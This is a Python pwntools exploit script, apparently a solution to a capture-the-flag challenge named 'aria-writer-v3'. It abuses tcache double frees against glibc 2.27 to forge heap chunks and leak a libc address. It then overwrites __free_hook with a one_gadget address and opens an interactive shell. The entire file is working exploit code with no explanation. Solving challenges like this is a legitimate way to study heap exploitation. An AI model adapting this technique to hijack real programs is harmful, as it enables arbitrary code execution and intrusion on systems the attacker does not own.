from pwn import *
context.log_level = 'debug'

TARGET = './aria-writer-v3'
HOST = ''
PORT = 0

# r = process(TARGET)
r = process(TARGET, env={"LD_PRELOAD":"./libc-2.27.so"})
# r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))
def create(size, cont):
    r.sendline('1')
    r.sendlineafter('pls >', str(size))
    r.sendlineafter('tho >', cont)
    return r.recvuntil('pls >')

def delete(): 
    r.sendline('2')
    r.recvuntil('pls >')

r.sendlineafter('>', p64(0x421))
# r.sendlineafter('>', p64(0x0))
r.recvuntil('pls >')

create(0x58, 'CCCC')
delete()
delete() 

create(0x38, 'AAAA')
delete()
delete()
create(0x38, p64(0x602460))
create(0x38, p64(0xdeadbeef))
create(0x38, p64(0)+p64(0x21)+p64(0) * 3+ p64(0x21))

create(0x28, 'CCCC')
delete()
delete() 
create(0x28, p64(0x602048))
create(0x28, 'CCCC')

create(0x18, 'BBBB')
delete()
delete()
create(0x18, p64(0x602050))
create(0x18, 'BBBB')
create(0x18, 'BBBB')
delete()

leak = create(0x28, 'A'*7).split('\n')[1][:6]

libc_leak = u64(leak.ljust(8, '\x00'))
dbg("libc_leak")
libc_base = libc_leak - 0x3ebca0
dbg("libc_base")

malloc_hook = libc_base + 0x3ebc30
free_hook = libc_base + 0x3ed8e8
gadget = [0x4f2c5, 0x4f322, 0x10a38c] 

create(0x58, 'CCCC')
delete()
delete() 

create(0x58, p64(free_hook))
create(0x58, 'CCCC')
create(0x58, p64(libc_base + gadget[1]))

r.sendline('2')
r.interactive()
